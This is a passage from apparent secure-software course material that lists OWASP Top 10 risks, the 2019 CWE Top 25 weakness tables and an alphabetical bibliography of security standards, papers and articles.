9. *Using Components with Known Vulnerabilities. Components, such as libraries, frameworks, and other software modules, run with the same privileges as the application. If a vulnerable component is exploited, such an attack can facilitate serious data loss or server takeover. Applications and APIs using components with known vulnerabilities may undermine application defenses and enable various attacks and impacts.*

10. *Insufficient Logging & Monitoring. Insufficient logging and monitoring, coupled with missing or ineffective integration with incident response, allows attackers to further attack systems, maintain persistence, pivot to more systems, and tamper, extract, or destroy data. Most breach studies show time to detect a breach is over 200 days, typically detected by external parties rather than internal processes or monitoring.”*

### CWE Top 25 (2019 edition)

Here is the 2019 edition of the [CWE Top 25 Most Dangerous Software Errors](https://cwe.mitre.org/top25/archive/2019/2019_cwe_top25.html). This list was created using real-world data, specifically, the publicly known vulnerabilities with Common Vulnerabilities and Exposures (CVE) as published in the National Institute of Standards and Technology (NIST) National Vulnerability Database (NVD), including the severity scores as calculated using the Common Vulnerability Scoring System (CVSS) scores. This list combines many different kinds of software; whether or not that is good depends on your perspective.

No system is perfect. A complication is that the CWEs identified here are at various hierarchical levels. For example, #1 [CWE-119](https://cwe.mitre.org/data/definitions/119.html) (*Improper Restriction of Operations within the Bounds of a Memory Buffer*) is a superset of both #5 [CWE-125](https://cwe.mitre.org/data/definitions/125.html) (*Out-of-bounds read*) and #12 [CWE-787](https://cwe.mitre.org/data/definitions/787.html) (*Out-of-bounds Write*), yet they are all listed here. Still, this does provide a defensible and repeatable approach for identifying what’s important.

#### Top 25 (2019)

<table>
  <tr>
    <td>Rank</td>
    <td>ID</td>
    <td>Name</td>
  </tr>
  <tr>
    <td>[1]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/119.html">CWE-119</a></td>
    <td>Improper Restriction of Operations within the Bounds of a Memory Buffer</td>
  </tr>
  <tr>
    <td>[2]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79</a></td>
    <td>Improper Neutralization of Input During Web Page Generation (‘Cross-site Scripting’)</td>
  </tr>
  <tr>
    <td>[3]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20</a></td>
    <td>Improper Input Validation</td>
  </tr>
  <tr>
    <td>[4]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/200.html">CWE-200</a></td>
    <td>Information Exposure</td>
  </tr>
  <tr>
    <td>[5]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/125.html">CWE-125</a></td>
    <td>Out-of-bounds Read</td>
  </tr>
  <tr>
    <td>[6]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89</a></td>
    <td>Improper Neutralization of Special Elements used in an SQL Command (‘SQL Injection’)</td>
  </tr>
  <tr>
    <td>[7]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/416.html">CWE-416</a></td>
    <td>Use After Free</td>
  </tr>
  <tr>
    <td>[8]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/190.html">CWE-190</a></td>
    <td>Integer Overflow or Wraparound</td>
  </tr>
  <tr>
    <td>[9]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/352.html">CWE-352</a></td>
    <td>Cross-Site Request Forgery (CSRF)</td>
  </tr>
  <tr>
    <td>[10]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/22.html">CWE-22</a></td>
    <td>Improper Limitation of a Pathname to a Restricted Directory (‘Path Traversal’)</td>
  </tr>
  <tr>
    <td>[11]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/78.html">CWE-78</a></td>
    <td>Improper Neutralization of Special Elements used in an OS Command (‘OS Command Injection’)</td>
  </tr>
  <tr>
    <td>[12]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/787.html">CWE-787</a></td>
    <td>Out-of-bounds Write</td>
  </tr>
  <tr>
    <td>[13]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/287.html">CWE-287</a></td>
    <td>Improper Authentication</td>
  </tr>
  <tr>
    <td>[14]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/476.html">CWE-476</a></td>
    <td>NULL Pointer Dereference</td>
  </tr>
  <tr>
    <td>[15]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/732.html">CWE-732</a></td>
    <td>Incorrect Permission Assignment for Critical Resource</td>
  </tr>
  <tr>
    <td>[16]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/434.html">CWE-434</a></td>
    <td>Unrestricted Upload of File with Dangerous Type</td>
  </tr>
  <tr>
    <td>[17]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/611.html">CWE-611</a></td>
    <td>Improper Restriction of XML External Entity Reference</td>
  </tr>
  <tr>
    <td>[18]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94</a></td>
    <td>Improper Control of Generation of Code (‘Code Injection’)</td>
  </tr>
  <tr>
    <td>[19]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/798.html">CWE-798</a></td>
    <td>Use of Hard-coded Credentials</td>
  </tr>
  <tr>
    <td>[20]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/400.html">CWE-400</a></td>
    <td>Uncontrolled Resource Consumption</td>
  </tr>
  <tr>
    <td>[21]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/772.html">CWE-772</a></td>
    <td>Missing Release of Resource after Effective Lifetime (!)</td>
  </tr>
  <tr>
    <td>[22]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/426.html">CWE-426</a></td>
    <td>Untrusted Search Path (!)</td>
  </tr>
  <tr>
    <td>[23]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/502.html">CWE-502</a></td>
    <td>Deserialization of Untrusted Data</td>
  </tr>
  <tr>
    <td>[24]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/269.html">CWE-269</a></td>
    <td>Improper Privilege Management</td>
  </tr>
  <tr>
    <td>[25]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/295.html">CWE-295</a></td>
    <td>Improper Certificate Validation</td>
  </tr>
</table>

Ones marked with (!) are in the 2019 edition but not the 2021 edition.


#### On the Cusp (2019)

The developers of the CWE Top 25 felt that there were a number of weaknesses that were important, but did not manage to be in their top 25 because they were not as prevalent or tended to be less severe. They call these weaknesses *on the cusp*.

Developers that complete mitigation and risk decision-making on the 2019 CWE Top 25 may want to look for these other weaknesses potentially present in their software. For these reasons, users of the 2019 CWE Top 25 should seriously consider including these additional weaknesses in their analyses:

<table>
  <tr>
    <td>Rank</td>
    <td>ID</td>
    <td>Name</td>
  </tr>
  <tr>
    <td>[26]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/835.html">CWE-835</a></td>
    <td>Loop with Unreachable Exit Condition (‘Infinite Loop’) (!)</td>
  </tr>
  <tr>
    <td>[27]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/522.html">CWE-522</a></td>
    <td>Insufficiently Protected Credentials</td>
  </tr>
  <tr>
    <td>[28]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/704.html">CWE-704</a></td>
    <td>Incorrect Type Conversion or Cast (!)</td>
  </tr>
  <tr>
    <td>[29]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/362.html">CWE-362</a></td>
    <td>Concurrent Execution using Shared Resource with Improper Synchronization (‘Race Condition’)</td>
  </tr>
  <tr>
    <td>[30]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918</a></td>
    <td>Server-Side Request Forgery (SSRF)</td>
  </tr>
  <tr>
    <td>[31]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/415.html">CWE-415</a></td>
    <td>Double Free (!)</td>
  </tr>
  <tr>
    <td>[32]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/601.html">CWE-601</a></td>
    <td>URL Redirection to Untrusted Site (‘Open Redirect’)</td>
  </tr>
  <tr>
    <td>[33]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/863.html">CWE-863</a></td>
    <td>Incorrect Authorization</td>
  </tr>
  <tr>
    <td>[34]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/862.html">CWE-862</a></td>
    <td>Missing Authorization</td>
  </tr>
  <tr>
    <td>[35]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/532.html">CWE-532</a></td>
    <td>Inclusion of Sensitive Information in Log Files</td>
  </tr>
  <tr>
    <td>[36]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/306.html">CWE-306</a></td>
    <td>Missing Authentication for Critical Function</td>
  </tr>
  <tr>
    <td>[37]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/384.html">CWE-384</a></td>
    <td>Session Fixation (!)</td>
  </tr>
  <tr>
    <td>[38]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/326.html">CWE-326</a></td>
    <td>Inadequate Encryption Strength (!)</td>
  </tr>
  <tr>
    <td>[39]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/770.html">CWE-770</a></td>
    <td>Allocation of Resources Without Limits or Throttling</td>
  </tr>
  <tr>
    <td>[40]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/617.html">CWE-617</a></td>
    <td>Reachable Assertion (!)</td>
  </tr>
</table>

Ones marked with (!) are in the 2019 edition but not the 2021 edition.

# References

(Not part of the course per se)

Aleph One (Elias Levy), *Smashing the Stack for Fun and Profit*, Phrack #49, 1996 ([http://phrack.org/issues/49/14.html#article](http://phrack.org/issues/49/14.html#article))

Amodio, Dan Amodio, "Remote Code with Expression Language Injection", 2012-12-14. (<http://danamodio.com/appsec/research/spring-remote-code-with-expression-language-injection/>)

Anderson, James P., *Computer Security Technology Planning Study*, volume I, ESD-TR-73-51 (Volumes I and II), October 1972 ([https://csrc.nist.gov/csrc/media/publications/conference-paper/1998/10/08/proceedings-of-the-21st-nissc-1998/documents/early-cs-papers/ande72a.pdf](https://csrc.nist.gov/csrc/media/publications/conference-paper/1998/10/08/proceedings-of-the-21st-nissc-1998/documents/early-cs-papers/ande72a.pdf)) and ([https://csrc.nist.rip/publications/history/ande72.pdf](https://csrc.nist.rip/publications/history/ande72.pdf))

Anderson, James P., *Computer Security Technology Planning Study*, volume II, 1972 ([https://apps.dtic.mil/dtic/tr/fulltext/u2/772806.pdf](https://apps.dtic.mil/dtic/tr/fulltext/u2/772806.pdf))

Anderson, Ross, *Security Engineering: A Guide to Building Dependable Distributed Systems* ([https://www.cl.cam.ac.uk/~rja14/book.html](https://www.cl.cam.ac.uk/~rja14/book.html))

Backus, J.W., R.J. Beeber, S. Best, R. Goldberg, H.L. Herrick, R.A. Hughes, L.B. Mitchell, R.A. Nelson, R. Nutt, D. Sayre, P.B. Sheridan, H. Stern, I. Ziller. *The FORTRAN Automatic Coding System for IBM 704 EDPM: Programmer’s Reference Manual*, Applied Science Division and Programming Research Department, International Business Machines Corporation, 1956-10-15 ([https://archive.computerhistory.org/resources/text/Fortran/102649787.05.01.acc.pdf](https://archive.computerhistory.org/resources/text/Fortran/102649787.05.01.acc.pdf))

Bals, Fred, *The AppSec alphabet soup: A guide to SAST, IAST, DAST, and RASP*, Synopsys “Software Integrity” blog, 2018-08-14 ([https://www.synopsys.com/blogs/software-security/sast-iast-dast-rasp-differences/](https://www.synopsys.com/blogs/software-security/sast-iast-dast-rasp-differences/))

Barker, Elaine, *Recommendation for Key Management: Part 1 - General*, NIST Special Publication 800-57 Part 1 Revision 5, 2020,  ([https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-57pt1r5.pdf](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-57pt1r5.pdf))

Birsan, Alex, 2021-02-09, “Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies”, (<https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610>)

Bobby Tables, "Java", (<https://bobby-tables.com/java>)

Black, Paul E.; Badger, Lee; Guttman, Barbara; Fong, Elizabeth, *Dramatically Reducing Software Vulnerabilities: Report to the White House Office of Science and Technology Policy*, NISTIR 8151, US National Institute of Standards and Technology (NIST) Information Technology Laboratory, 2016-11 ([https://nvlpubs.nist.gov/nistpubs/ir/2016/NIST.IR.8151.pdf](https://nvlpubs.nist.gov/nistpubs/ir/2016/NIST.IR.8151.pdf))

Breeden II, John, *9 top fuzzing tools: Finding the weirdest application errors*, 2019 ([https://www.csoonline.com/article/3487708/9-top-fuzzing-tools-finding-the-weirdest-application-errors.html](https://www.csoonline.com/article/3487708/9-top-fuzzing-tools-finding-the-weirdest-application-errors.html))

Bressers, Josh, *Broken vulnerabilities severities*, 2020-05-25 ([https://opensourcesecurity.io/2020/05/27/broken-vulnerability-severities/](https://opensourcesecurity.io/2020/05/27/broken-vulnerability-severities/))

Butler, Ricky W., *What is Formal Methods?* ([https://shemesh.larc.nasa.gov/fm/fm-what.html](https://shemesh.larc.nasa.gov/fm/fm-what.html))

C FAQ list ([http://c-faq.com/ansi/undef.html](http://c-faq.com/ansi/undef.html))

Carlini, Nicholas, & David Wagner, 2017,
"Adversarial Examples Are Not Easily Detected: Bypassing Ten Detection Methods”

Carlini, Nicholas Anish Athlye, Nicolas Papernot, et al., “On Evaluating Adversarial Robustness”, 2019-02-20, <https://arxiv.org/pdf/1902.06705>.

Carnegie Mellon University: Software Engineering Institute, CERT Division ([https://sei.cmu.edu/about/divisions/cert/index.cfm](https://sei.cmu.edu/about/divisions/cert/index.cfm))

Chen, Raymond, *Undefined behavior can result in time travel (among other things, but time travel is the funkiest)*, 2014-06-27, ([https://devblogs.microsoft.com/oldnewthing/20140627-00/?p=633](https://devblogs.microsoft.com/oldnewthing/20140627-00/?p=633))

Cimpanu, Catalin, *Microsoft: 70 percent of all security bugs are memory safe issues*, 2019-02-11 ([https://www.zdnet.com/article/microsoft-70-percent-of-all-security-bugs-are-memory-safety-issues/](https://www.zdnet.com/article/microsoft-70-percent-of-all-security-bugs-are-memory-safety-issues/))

Cimpanu, Catalin, "Two malicious Python libraries caught stealing SSH and GPG keys", ZDNet, 2019-12-03, <https://www.zdnet.com/article/two-malicious-python-libraries-removed-from-pypi>

CISCO, *Next Generation Cryptography* ([https://tools.cisco.com/security/center/resources/next_generation_cryptography](https://tools.cisco.com/security/center/resources/next_generation_cryptography))

Coggeshall, John, *Updating the Git protocol for SHA-256*, 2020 ([https://lwn.net/Articles/823352/](https://lwn.net/Articles/823352/))

Commission Nationale Informatique & Libertés (CNIL), *The CNIL’s Guides: Security of Personal Data*, 2018 ([https://www.cnil.fr/sites/default/files/atoms/files/cnil_guide_securite_personnelle_gb_web.pdf](https://www.cnil.fr/sites/default/files/atoms/files/cnil_guide_securite_personnelle_gb_web.pdf))

Commission Nationale Informatique & Libertés (CNIL), *Solutions for a responsible use of the blockchain in the context of personal data*, 2018 ([https://www.cnil.fr/sites/default/files/atoms/files/blockchain_en.pdf](https://www.cnil.fr/sites/default/files/atoms/files/blockchain_en.pdf))

Common Criteria, *Common Criteria for Information Technology Security Evaluation (CC) part 2* ([https://www.commoncriteriaportal.org/](https://www.commoncriteriaportal.org/))

Corbet, Jonathan, *A new hash algorithm for Git*, 2020 ([https://lwn.net/Articles/811068/](https://lwn.net/Articles/811068/))

Cox, Ben,  “Auditing GitHub users’ SSH key quality”, 2015-06-02 (<https://blog.benjojo.co.uk/post/auditing-github-users-keys>)

Cybersecurity & Infrastructure Security Agency (CISA), Emergency Directive 21-01, (<https://www.cisa.gov/emergency-directive-21-01>)
Cybersecurity & Infrastructure Security Agency (CISA), Alert AA20-352A, (<https://www.cisa.gov/uscert/ncas/alerts/aa20-352a>)

Dechand, Sergej, *What is FAST?*, 2020 ([https://blog.code-intelligence.com/what-is-fast](https://blog.code-intelligence.com/what-is-fast))

Delaitre, Aurelien; Stivalet, Bertrand; Black, Paul E.; Okun, Vadim; Ribeiro, Athos; Cohen, Terry S., *SATE V Report: Ten Years of Static Analysis Tool Expositions*, NIST Special Publication 500-326, 2018 ([https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.500-326.pdf](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.500-326.pdf)) or ([https://doi.org/10.6028/NIST.SP.500-326](https://doi.org/10.6028/NIST.SP.500-326))

Di Paola, Stefano, and Arshan Dabirsiaghi. "Expression Language Injection", 2011-09-12, (<https://www.mindedsecurity.com/fileshare/ExpressionLanguageInjection.pdf>)

Dulin, Maxwell (ꓘ), Finding an Authorization Bypass on my Own Website, 2022-03-03, (<https://maxwelldulin.com/BlogPost?post=9185867776>)

ECMA, ECMA-262, 12th edition, June 2021, ECMAScript® 2021 Language Specification, “The Number Type” ([https://www.ecma-international.org/ecma-262/11.0/index.html#sec-ecmascript-language-types-number-type](https://www.ecma-international.org/ecma-262/11.0/index.html#sec-ecmascript-language-types-number-type))

Enosuchblog, 2022-12-28, "ReDoS "vulnerabilities" and misaligned incentives", <https://blog.yossarian.net/2022/12/28/ReDoS-vulnerabilities-and-misaligned-incentives>

Enable Cross-Origin Resource Sharing ([https://enable-cors.org/](https://enable-cors.org/))

Flatt Security Inc,, "Finding an unseen SQL Injection by bypassing escape functions in mysqljs/mysql", 2022-02-21, (<https://flattsecurity.medium.com/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql-90b27f6542b4>)

Forum of Incident Response and Security Teams (FIRST), *FIRST Services Framework* ([https://www.first.org/standards/frameworks/](https://www.first.org/standards/frameworks/))

Forum of Incident Response and Security Teams (FIRST), *Product Security Incident Response Team (PSIRT) Services Framework* ([https://www.first.org/standards/frameworks/](https://www.first.org/standards/frameworks/))

Forum of Incident Response and Security Teams (FIRST), *Computer Security Incident Response Team (CSIRT) Services Framework* ([https://www.first.org/standards/frameworks/](https://www.first.org/standards/frameworks/))

Forum of Incident Response and Security Teams (FIRST), *Guidelines and Practices for Multi-Party Vulnerability Coordination and Disclosure*, ([https://www.first.org/global/sigs/vulnerability-coordination/multiparty/guidelines-v1.1](https://www.first.org/global/sigs/vulnerability-coordination/multiparty/guidelines-v1.1))

Forum of Incident Response and Security Teams (FIRST), *Traffic Light Protocol (TLP)* ([https://www.first.org/tlp/](https://www.first.org/tlp/))

Friedl, Jeffrey E.F., *Mastering Regular Expressions*, 3rd Edition, O’Reilly Media,  ISBN 9780596528126, 2006-08 ([https://www.oreilly.com/library/view/mastering-regular-expressions/0596528124/](https://www.oreilly.com/library/view/mastering-regular-expressions/0596528124/))

Garavel, Hubert, et al, *Formal Methods for Safe and Secure Computers Systems*, BSI Study 875, 2013 ([https://www.bsi.bund.de/SharedDocs/Downloads/DE/BSI/Publikationen/Studien/formal_methods_study_875/formal_methods_study_875.pdf?&#95;&#95;blob=publicationFile&v=1](https://www.bsi.bund.de/SharedDocs/Downloads/DE/BSI/Publikationen/Studien/formal_methods_study_875/formal_methods_study_875.pdf?&#95;&#95;blob=publicationFile&v=1))

Georgiev, Martin; Iyengar, Subodh; Jana, Suman; Anubhai, Rishita; Boneh, Dan; Shmatikov, Vitaly; *The Most Dangerous Code in the World: Validating SSL Certificates in Non-Browser Software*, 2012 ([https://www.cs.utexas.edu/~shmat/shmat_ccs12.pdf](https://www.cs.utexas.edu/~shmat/shmat_ccs12.pdf))

Gerrand, Andrew, *The Go Blog: Error handling and Go*, 2011 ([https://blog.golang.org/error-handling-and-go](https://blog.golang.org/error-handling-and-go))

GitHub Security, *Password reset emails delivered to the wrong address*, 2016-07-05 ([https://bounty.github.com/researchers/jagracey.html](https://bounty.github.com/researchers/jagracey.html))

GitLab, *What is GitOps?* ([https://about.gitlab.com/topics/gitops/])

Goodin, Dan, 2015, "Once seen as bulletproof, 11 million+ Ashley Madison passwords already cracked", *Ars Technica*, <https://arstechnica.com/information-technology/2015/09/once-seen-as-bulletproof-11-million-ashley-madison-passwords-already-cracked/>

Gooding, Dan, *Plundering of crypto keys from ultrasecure SGX sends Intel scrambling again*, Ars Technica, 2020-06-09 ([https://arstechnica.com/information-technology/2020/06/new-exploits-plunder-crypto-keys-and-more-from-intels-ultrasecure-sgx/](https://arstechnica.com/information-technology/2020/06/new-exploits-plunder-crypto-keys-and-more-from-intels-ultrasecure-sgx/))

Google, OSS-Fuzz project ([https://github.com/google/oss-fuzz](https://github.com/google/oss-fuzz))

Greenwald, Glenn, *Why privacy matters*, 2014 ([https://www.ted.com/talks/glenn_greenwald_why_privacy_matters](https://www.ted.com/talks/glenn_greenwald_why_privacy_matters) or [https://www.youtube.com/watch?v=pcSlowAhvUk](https://www.youtube.com/watch?v=pcSlowAhvUk))

Hernan, Shawn; Lambert, Scott; Ostwald, Tomasz; Shostack, Adam, *Threat Modeling: Uncover Security Design Flaws Using the STRIDE Approach*, 2006 ([https://web.archive.org/web/20070303103639/http://msdn.microsoft.com/msdnmag/issues/06/11/ThreatModeling/default.aspx](https://web.archive.org/web/20070303103639/http://msdn.microsoft.com/msdnmag/issues/06/11/ThreatModeling/default.aspx))

Householder, Allen, *The CERT Guide to Coordinated Vulnerability Disclosure*, 2019 ([https://vuls.cert.org/confluence/display/CVD/The+CERT+Guide+to+Coordinated+Vulnerability+Disclosure](https://vuls.cert.org/confluence/display/CVD/The+CERT+Guide+to+Coordinated+Vulnerability+Disclosure))

Hubbard, Douglas, *The Failure of Risk Management: Why It’s Broken and How to Fix It*, John Wiley & Sons. p. 46, 2009 ([https://onlinelibrary.wiley.com/doi/book/10.1002/9781119198536](https://onlinelibrary.wiley.com/doi/book/10.1002/9781119198536))

IETF RFC 1983, *Internet Users’ Glossary*  ([https://tools.ietf.org/html/rfc1983](https://tools.ietf.org/html/rfc1983))

IETF RFC 3986, *Uniform Resource Identifier (URI): Generic Syntax* ([https://tools.ietf.org/html/rfc3986](https://tools.ietf.org/html/rfc3986))

IETF RFC 5321, section 2.3.11, *Mailbox and Address* ([https://tools.ietf.org/html/rfc5321#section-2.3.11](https://tools.ietf.org/html/rfc5321#section-2.3.11))

Information Commissioner’s Office (ICO), *Guide to the General Data Protection Regulation (GDPR)* ([https://ico.org.uk/for-organisations/guide-to-data-protection/guide-to-the-general-data-protection-regulation-gdpr/](https://ico.org.uk/for-organisations/guide-to-data-protection/guide-to-the-general-data-protection-regulation-gdpr/))

International Association for Privacy Professionals (IAPP), *What does privacy mean?* ([https://iapp.org/about/what-is-privacy/](https://iapp.org/about/what-is-privacy/))

ISO/IEC 9899:2018, *Programming Languages - C* (aka “C17”).  This standard is not publicly available; its final draft is publicly available at ([https://web.archive.org/web/20181230041359if_/http://www.open-std.org/jtc1/sc22/wg14/www/abq/c17_updated_proposed_fdis.pdf](https://web.archive.org/web/20181230041359if_/http://www.open-std.org/jtc1/sc22/wg14/www/abq/c17_updated_proposed_fdis.pdf))

ISO/IEC 15026-2:2011, *Systems and software engineering - Systems and software assurance - Part 2: Assurance case* ([https://www.iso.org/standard/52926.html](https://www.iso.org/standard/52926.html))

Kaplan-Moss, Jacob, *Not all attackers are equal: understanding and preventing DOS in web applications*, 2020 ([https://r2c.dev/blog/2020/understanding-and-preventing-dos-in-web-apps/](https://r2c.dev/blog/2020/understanding-and-preventing-dos-in-web-apps/))

kernel.org, *Linux kernel coding style* ([https://www.kernel.org/doc/Documentation/process/coding-style.rst](https://www.kernel.org/doc/Documentation/process/coding-style.rst))

Levien, Raph, *With Undefined Behavior, Anything is Possible*, 2018-08-17, ([https://raphlinus.github.io/programming/rust/2018/08/17/undefined-behavior.html](https://raphlinus.github.io/programming/rust/2018/08/17/undefined-behavior.html))

Linux Foundation, *Understanding Open Source Technology & US Export Controls*, 2021-07-19, <https://www.linuxfoundation.org/tools/understanding-us-export-controls-with-open-source-projects/>)

Loukides, Mike, *Revisiting “What Is DevOps”*, 2014-06-30 ([http://radar.oreilly.com/2014/06/revisiting-what-is-devops.html](http://radar.oreilly.com/2014/06/revisiting-what-is-devops.html))

MacCarthaigh, Colm, *Automated Reasoning and Amazon s2n*, 2016-09-08 ([https://aws.amazon.com/blogs/security/automated-reasoning-and-amazon-s2n/](https://aws.amazon.com/blogs/security/automated-reasoning-and-amazon-s2n/))

Microsoft, *Naming Files, Paths and Namespaces* ([http://msdn.microsoft.com/en-us/library/aa365247.aspx](http://msdn.microsoft.com/en-us/library/aa365247.aspx))

Microsoft, *Threat Modeling* ([https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling](https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling))

Microsoft, *Timing vulnerabilities with CBC-mode symmetric decryption using padding*, 2020-07-15 ([https://docs.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode](https://docs.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode))

Microsoft,  “3 Ways to Mitigate Risk When Using Private Package Feeds”, (<https://azure.microsoft.com/en-us/resources/3-ways-to-mitigate-risk-using-private-package-feeds/>)

Minocha, Shreyas, *Regular Expressions for Regular Folk* ([https://refrf.shreyasminocha.me/](https://refrf.shreyasminocha.me/))

Mitchell, Tom, 1997, *Machine Learning*. New York: McGraw Hill. ISBN 0-07-042807-7. OCLC 36417892.

MITRE ([https://www.mitre.org/](https://www.mitre.org/))

MITRE, Common Weakness Enumeration (CWE) ([https://cwe.mitre.org/](https://cwe.mitre.org/))

MITRE, Common Weakness Enumeration (CWE), *2019 CWE Top 25 Most Dangerous Software Errors* ([https://cwe.mitre.org/top25/archive/2019/2019_cwe_top25.html](https://cwe.mitre.org/top25/archive/2019/2019_cwe_top25.html))

Mozilla, *Cross-Origin Resource Sharing (CORS)* ([https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS))

Mozilla wiki, *Oxidation* ([https://wiki.mozilla.org/Oxidation](https://wiki.mozilla.org/Oxidation))

Mozilla wiki, *Security/Server Side TLS* ([https://wiki.mozilla.org/Security/Server_Side_TLS](https://wiki.mozilla.org/Security/Server_Side_TLS))

Mozilla, Rust vs. C++ in macOS Firefox Nightly ([https://docs.google.com/spreadsheets/d/1flUGg6Ut4bjtyWdyH_9emD9EAN01ljTAVft2S4Dq620/edit#gid=885787479](https://docs.google.com/spreadsheets/d/1flUGg6Ut4bjtyWdyH_9emD9EAN01ljTAVft2S4Dq620/edit#gid=885787479))

Mozilla, *Same-Origin Policy* ([https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy))

National Vulnerability Database (NVD), CVE-2021-44228, (<https://nvd.nist.gov/vuln/detail/CVE-2021-44228>)

Newcombe, Chris; Rath, Tim; Zhang, Fan; Munteanu, Bogdan; Brooker, Marc; Daerdeuff, Michael, *Use of Formal Methods at Amazon Web Services*, 2014-09-29 ([https://lamport.azurewebsites.net/tla/formal-methods-amazon.pdf](https://lamport.azurewebsites.net/tla/formal-methods-amazon.pdf))

Newcombe, Chris; Rath, Tim; Zhang, Fan; Munteanu, Bogdan; Brooker, Marc; Daerdeuff, Michael, *How Amazon Web Services Uses Formal Methods*, Communications of the ACM, Vol. 58 No. 4, Pages 66-73, 10.1145/2699417, 2015-04 ([https://cacm.acm.org/magazines/2015/4/184701-how-amazon-web-services-uses-formal-methods/fulltext](https://cacm.acm.org/magazines/2015/4/184701-how-amazon-web-services-uses-formal-methods/fulltext))

Nicolae, Maria-Irina, Mathieu Sinn, Minh Ngoc Tran, Beat Buesser, Ambrish Rawat, Martin Wistuba, Valentina Zantedeschi, Nathalie Baracaldo, Bryant Chen, Heiko Ludwig, Ian M. Molloy, Ben Edwards,
Adversarial Robustness Toolbox v1.0.0
2019-11-15
<https://arxiv.org/abs/1807.01069>

Official EU site for the GDPR text ([https://eur-lex.europa.eu/eli/reg/2016/679/oj](https://eur-lex.europa.eu/eli/reg/2016/679/oj))

Ohm, Marc; Plate, Henrik; Sykosch, Arnold; Meier, Michal, *Backstabber’s Knife Collection: A Review of Open Source Software Supply Chain Attacks*, 2020-05-19 ([https://arxiv.org/abs/2005.09535](https://arxiv.org/abs/2005.09535))

Open Source Security Foundation (OpenSSF), *OpenSSF Best Practices Badge Program* ([https://bestpractices.coreinfrastructure.org/en](https://bestpractices.coreinfrastructure.org/en))

Open Source Security Foundation (OpenSSF), *BadgeApp Security: Its Assurance Case* ([https://github.com/coreinfrastructure/best-practices-badge/blob/master/doc/security.md](https://github.com/coreinfrastructure/best-practices-badge/blob/master/doc/security.md))

Open Source Security Foundation (OpenSSF), Vulnerability Disclosures Working Group ([https://github.com/ossf/wg-vulnerability-disclosures](https://github.com/ossf/wg-vulnerability-disclosures))

The Open Source Security Foundation (OpenSSF) Vulnerability Disclosures Working Group, Guide to coordinated vulnerability disclosure for open source software projects ([https://github.com/ossf/oss-vulnerability-guide](https://github.com/ossf/oss-vulnerability-guide))

Open Web Application Security Project (OWASP), *OWASP Top 10 Web Application Security Risks* ([https://owasp.org/www-project-top-ten](https://owasp.org/www-project-top-ten))

Open Web Application Security Project (OWASP), *OWASP Mobile Top 10* ([https://owasp.org/www-project-mobile-top-10/](https://owasp.org/www-project-mobile-top-10/))

Open Web Application Security Project (OWASP), *OWASP Internet of Things Project* ([https://wiki.owasp.org/index.php/OWASP_Internet_of_Things_Project](https://wiki.owasp.org/index.php/OWASP_Internet_of_Things_Project))

Open Web Application Security Project (OWASP), *Regular expression Denial of Service - ReDoS* ([https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS))

Open Web Application Security Project (OWASP), *OWASP XML External Entities (XXE)* ([https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE).html](https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE).html))

